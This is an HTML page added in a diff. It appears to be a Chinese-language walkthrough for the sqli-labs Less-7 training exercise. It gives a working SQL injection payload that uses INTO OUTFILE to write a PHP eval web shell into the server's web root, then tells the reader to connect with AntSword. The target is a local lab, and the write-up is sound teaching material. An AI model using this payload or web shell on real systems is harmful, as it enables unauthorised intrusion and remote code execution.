@@ -1,0 +1,12 @@
+<h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>这一次闭合类型试判断为((‘’))</p>
+<p>这一关多了一个小tips告诉我要用到outfile</p>
+<blockquote>
+<p>我们在写入信息的时候希望多余的信息不要，那么我们就将id报错，或者说没有也就是加上负号-</p>
+</blockquote>
+<p>我们可以上传一句话木马，也可以查询版本和数据库</p>
+<p>写入一句话木马用into outfile函数</p>
+<p>‍</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><blockquote>
+<p>​<code>http://127.0.0.1/sqli-labs/Less-7/ ?id=-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;a&#39;]);echo &#39;luck&#39;;?&gt;&quot; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\a.php&#39; --+</code>​</p>
+</blockquote>
+<p>然后用蚁剑链接即可</p>
